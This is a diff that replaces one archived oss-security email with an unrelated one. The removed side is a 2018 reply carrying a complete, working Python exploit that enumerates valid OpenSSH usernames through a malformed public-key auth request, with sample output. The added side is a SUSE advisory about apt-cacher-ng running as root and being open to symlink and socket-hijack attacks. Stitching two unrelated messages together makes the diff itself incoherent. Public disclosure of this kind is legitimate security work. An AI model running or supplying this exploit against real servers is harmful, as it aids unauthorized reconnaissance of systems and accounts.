@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3914" "Thursday" "16" "August" "2018" "23:43:07" "+1200" "Matthew Daley" "mattd@bugfuzz.com" "<CAD3CanckcSk0T5sGa4LxsShYhkTDc8u6Fgdz=jvJ90buwDiH1g@mail.gmail.com>" "117" "Re: [oss-security] OpenSSH Username Enumeration" "^Date:" nil nil "8" "2018081611:43:07" "[oss-security] OpenSSH Username Enumeration" (number mark "        mattd@bugfuz Aug 16  117/3914  " thread-indent "\"Re: [oss-security] OpenSSH Username Enumeration\"\n") "<20180815160558.GA23020@localhost.localdomain>" ("<20180815160558.GA23020@localhost.localdomain>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3357" "Monday" "20" "January" "2020" "15:50:28" "+0100" "Matthias Gerstner" "mgerstner@suse.de" "<20200120145027.GF10486@f195.suse.de>" "80" "[oss-security] CVE-2019-18899: apt-cacher-ng: openSUSE packaging for apt-cacher-ng runs the daemon as root instead of as an unprivileged user" nil nil nil "1" "2020012014:50:28" "[oss-security] CVE-2019-18899: apt-cacher-ng: openSUSE packaging for apt-cacher-ng runs the daemon as root instead of as an unprivileged user" (number mark "U       mgerstner@su Jan 20   80/3357  " thread-indent "\"[oss-security] CVE-2019-18899: apt-cacher-ng: openSUSE packaging for apt-cacher-ng runs the daemon as root instead of as an unprivileged user\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2019-18899: apt-cacher-ng: openSUSE packaging for apt-cacher-ng runs the daemon as root instead of as an unprivileged user" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 25870 invoked by uid 550); 16 Aug 2018 11:43:40 -0000
+Received: (qmail 3779 invoked by uid 550); 20 Jan 2020 14:50:40 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,158 +11,98 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 25850 invoked from network); 16 Aug 2018 11:43:39 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=bugfuzz-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
-        bh=cs7PA8CZN1QxhW/72oq0Qo5RJIZ4p/CargVsM5DuBO4=;
-        b=2HB55vQLRvq7iBfAkHNxqk2VZbHkx+jDtdPB0QhpapTweGy/zyixy/sD7BrnfKaeyl
-         XBU6E5PHoS7V07f+90yMJo7qqtFTROLudnVYPdnKDWUyAqwRr9cf3tr/IEuiPZfEWl7o
-         Pf8wcBRHggzUuId+f+VyQLyfeRkmUnZ+lHePdFviR9PUa/Tpue18t0YQcf+b/wijMboX
-         o2iFQvtrjj7xrfCR0OPblO9k6JKw4Q/C0cRQvtg+tu+QMUOrafwvyreMGy0w42vNFCxr
-         gHilQAVmwMRYBwtMNz21qWt+nPCNlzvF8aN5fMQvUB2HBbrqEZLG+ha32itMcO23q6aa
-         mHMQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
-         :message-id:subject:to;
-        bh=cs7PA8CZN1QxhW/72oq0Qo5RJIZ4p/CargVsM5DuBO4=;
-        b=OGryDmePQ9DEcOV6+hJfdvqmErC9s4XSaLxkiP6wi0KiEdA9nh8QJAXOEgH4DyPqXE
-         3cWRXvPJRcV67/USFR8guhk+OovyrK/w7BT99DR7BhrxZecDHTQH2s27bQSrgYJ4TRLR
-         BA21KuN59jbnJBpfk8+XmsPniPnCc+J4Fz6LnVOwaWZippDJlQ+eo+rAjK+gcBwnSKsy
-         NUDxdiwizIgz+eijNC6JK9tCbYRFq2uNlgjCI8zy6gVfp3p96mhWQPR+FtnoBnAP25Yn
-         zoQFAQJJFQ4xAkmu90ZRdhP8Ru+hUGH0sBodzIxoqT3+fiDDveitKuBpxMpS1HEK7XMY
-         I4dw==
-X-Gm-Message-State: AOUpUlFNVV6otTXJQrPzrMJsXuEOAxPlk4N50ZMUrn7cgmNq/H55gjFj
-	YYC4dCZPtzZk9eYhmbvv61JKUyr0wn6+A9FR/IqQPAKHqNA=
-X-Google-Smtp-Source: AA+uWPwgxGxS/63BBN/qGFytjzfWlrH5QLvKGLx5Xa+UQkitpv6xP6oosnW+nTbZCM/nS4nXczTZAUrY1/0oqdArcWE=
-X-Received: by 2002:a2e:9b04:: with SMTP id u4-v6mr20447887lji.78.1534419808173;
- Thu, 16 Aug 2018 04:43:28 -0700 (PDT)
-MIME-Version: 1.0
-In-Reply-To: <20180815160558.GA23020@localhost.localdomain>
-References: <20180815160558.GA23020@localhost.localdomain>
-Message-ID: <CAD3CanckcSk0T5sGa4LxsShYhkTDc8u6Fgdz=jvJ90buwDiH1g@mail.gmail.com>
-Content-Type: text/plain; charset="UTF-8"
-Date: Thu, 16 Aug 2018 23:43:07 +1200
-From: Matthew Daley <mattd@bugfuzz.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] OpenSSH Username Enumeration
+Received: (qmail 3758 invoked from network); 20 Jan 2020 14:50:39 -0000
+X-Virus-Scanned: by amavisd-new at test-mx.suse.de
+Date: Mon, 20 Jan 2020 15:50:28 +0100
+From: Matthias Gerstner <mgerstner@suse.de>
 To: oss-security@lists.openwall.com
+Message-ID: <20200120145027.GF10486@f195.suse.de>
+MIME-Version: 1.0
+Content-Type: multipart/signed; micalg=pgp-sha256;
+	protocol="application/pgp-signature"; boundary="6cMF9JLEeZkfJjkP"
+Content-Disposition: inline
+User-Agent: Mutt/1.10.1 (2018-07-13)
+Subject: [oss-security] CVE-2019-18899: apt-cacher-ng: openSUSE packaging for apt-cacher-ng
+ runs the daemon as root instead of as an unprivileged user
 
-On 16 August 2018 at 04:05, Qualys Security Advisory <qsa@qualys.com> wrote:
-> The attacker can try to authenticate a user with a malformed packet (for
-> example, a truncated packet), and:
->
-> - if the user is invalid (it does not exist), then userauth_pubkey()
->   returns immediately, and the server sends an SSH2_MSG_USERAUTH_FAILURE
->   to the attacker;
->
-> - if the user is valid (it exists), then sshpkt_get_u8() fails, and the
->   server calls fatal() and closes its connection to the attacker.
+--6cMF9JLEeZkfJjkP
+Content-Type: text/plain; charset=iso-8859-1
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-I've written a POC for this issue, located at
-https://bugfuzz.com/stuff/ssh-check-username.py . It requires the
-Paramiko library (http://www.paramiko.org/) to be available. It does
-some gross monkey patching of Paramiko to force it into sending an
-invalid `SSH2_MSG_USERAUTH_REQUEST` and intercepting the potentially
-resultant `SSH2_MSG_USERAUTH_FAILURE` but seems to work well enough. A
-sample usage is as follows:
+Hi,
 
-$ nc test.internal 22
-SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u3
-^C
-$ ./ssh-check-username.py test.internal root
-[+] Valid username
-$ ./ssh-check-username.py test.internal www-data
-[+] Valid username
-$ ./ssh-check-username.py test.internal thisisinvalid
-[*] Invalid username
+apt-cacher-ng is a caching proxy for downloading packages from
+Debian-style software repositories [1]. In the course of a code review
+of apt-cacher-ng I noticed a mismatch between upstream configuration and
+the configuration used in the openSUSE packaging.
 
-The POC is also included below for archival purposes.
+While the upstream configuration expects the daemon to run as the
+apt-cacher-ng unprivileged user, the openSUSE packaging ships a
+diverging systemd service unit configuration, causing the apt-cacher-ng
+daemon to be running as the root user. Apart from a generally increased
+attack surface by not lowering privileges this causes the following
+security issue:
 
---- 8< ---
+Although the openSUSE packaging for apt-cacher-ng doesn't employ the
+unprivileged apt-cacher-ng user, it still creates it in the system. The
+directory /run/apt-cacher-ng is created for the apt-cacher-ng user via
+a systemd-tmpfiles configuration file from the upstream sources. This
+results in the apt-cacher-ng daemon running as root, which handles files
+in /run/apt-cacher-ng which is owned by the apt-cacher-ng user. The
+daemon correctly assumes that this directory is safe to handle without
+precautions, but this assumption is broken by the bad packaging.
 
-#!/usr/bin/env python
+Therefore a compromised apt-cacher-ng user account can perform symlink
+attacks in /run/apt-cacher-ng to cause writes to privileged file system
+locations by root, once the apt-cacher-ng service is (re)started.
+Furthermore the socket path /run/apt-cacher-ng/socket can be replaced by
+an attacker owned socket, thereby allowing him to hijack privileged
+client connections to apt-cacher-ng. Additional unexplored security
+issues could be possible.
 
-# Copyright (c) 2018 Matthew Daley
-#
-# Permission is hereby granted, free of charge, to any person obtaining a copy
-# of this software and associated documentation files (the "Software"), to
-# deal in the Software without restriction, including without limitation the
-# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
-# sell copies of the Software, and to permit persons to whom the Software is
-# furnished to do so, subject to the following conditions:
-#
-# The above copyright notice and this permission notice shall be included in
-# all copies or substantial portions of the Software.
-#
-# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
-# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
-# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
-# IN THE SOFTWARE.
+An update for the broken packaging will be supplied for openSUSE Leap
+15.1. Furthermore, since there is no active maintainer for the package
+in openSUSE, the apt-cacher-ng package is removed from the
+openSUSE:Factory project and thus from the openSUSE Tumbleweed rolling
+release distribution in the future.
 
+[1]: https://wiki.debian.org/AptCacherNg
 
-import argparse
-import logging
-import paramiko
-import socket
-import sys
+Cheers
 
+Matthias
 
-class InvalidUsername(Exception):
-    pass
+--=20
+Matthias Gerstner <matthias.gerstner@suse.de>
+Dipl.-Wirtsch.-Inf. (FH), Security Engineer
+https://www.suse.com/security
+Phone: +49 911 740 53 290
+GPG Key ID: 0x14C405C971923553
 
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG N=FCrnberg
+Gesch=E4ftsf=FChrer: Felix Imend=F6rffer
 
-def add_boolean(*args, **kwargs):
-    pass
+--6cMF9JLEeZkfJjkP
+Content-Type: application/pgp-signature; name="signature.asc"
 
+-----BEGIN PGP SIGNATURE-----
 
-old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
-        paramiko.common.MSG_SERVICE_ACCEPT]
+iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAl4lvjMACgkQFMQFyXGS
+NVOfMRAAvWE5c5csMmHPSC5EG3BboYOUrXZNbQaP3Hl5nKLgG4r4QxBM6Fk2Qin9
+Xb+8OCLUYbGr4iMvZPlAPJW/CkRx1u2gvr5g7EaKwgxaor4mEOAhdHtC3A33SwiC
+atKRmz2QTTtFfY1e992M5h3HNfqUhMQrsUdoRvHjVujM860UyhjtycSCdzRm8Gbr
+3aRqz3MdpdGcVCAude3+7SC/f3N/mco87qdhPI18QD1T6uKMBpOQu4k2902bxYN3
+rnRzHEOektA5uA1x8jgAf13CoQqM9lh2XnybfaPcIo1bQaufx+KMpmPn6PoPoLns
+UFGglnhZnxN8fO36FxoSmrSJQX+CjJgREEeSRJhkHw0DCgOTrvSEh86+rcf9K6QC
+mTZ0VOsCmKxriFeflIxiV/wRm+QtN8K1uBChNbpUD0Wa4zW9Oy63GgoRguYYa/mK
+9rh1XnAsdJIVebvDcJZ9+NuwdBndy0MSgjopNsaSNE/H8bjyH0DK/1CL+SFzdX1q
+B3rZgVqJhpRSFuXMOHkSZPI0HABBMwLOXxHd9R78j333r14Ulo8VpgNOfLWe8fU7
+T1c7tIiM/ZwyvBUuCeSBzIaPVQjWUejFVIo96/1Z2px5/ykCKnj35nUx8QzX/RgH
+Jk5istDBqfHaZh1UwhVagtt5XLKbeIAy3LvIE23jnzjXz4bRwP4=
+=m1eL
+-----END PGP SIGNATURE-----
 
-def service_accept(*args, **kwargs):
-    paramiko.message.Message.add_boolean = add_boolean
-    return old_service_accept(*args, **kwargs)
-
-
-def userauth_failure(*args, **kwargs):
-    raise InvalidUsername()
-
-
-paramiko.auth_handler.AuthHandler._handler_table.update({
-    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
-    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
-})
-
-logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
-
-arg_parser = argparse.ArgumentParser()
-arg_parser.add_argument('hostname', type=str)
-arg_parser.add_argument('--port', type=int, default=22)
-arg_parser.add_argument('username', type=str)
-args = arg_parser.parse_args()
-
-sock = socket.socket()
-try:
-    sock.connect((args.hostname, args.port))
-except socket.error:
-    print '[-] Failed to connect'
-    sys.exit(1)
-
-transport = paramiko.transport.Transport(sock)
-try:
-    transport.start_client()
-except paramiko.ssh_exception.SSHException:
-    print '[-] Failed to negotiate SSH transport'
-    sys.exit(2)
-
-try:
-    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
-except InvalidUsername:
-    print '[*] Invalid username'
-    sys.exit(3)
-except paramiko.ssh_exception.AuthenticationException:
-    print '[+] Valid username'
+--6cMF9JLEeZkfJjkP--
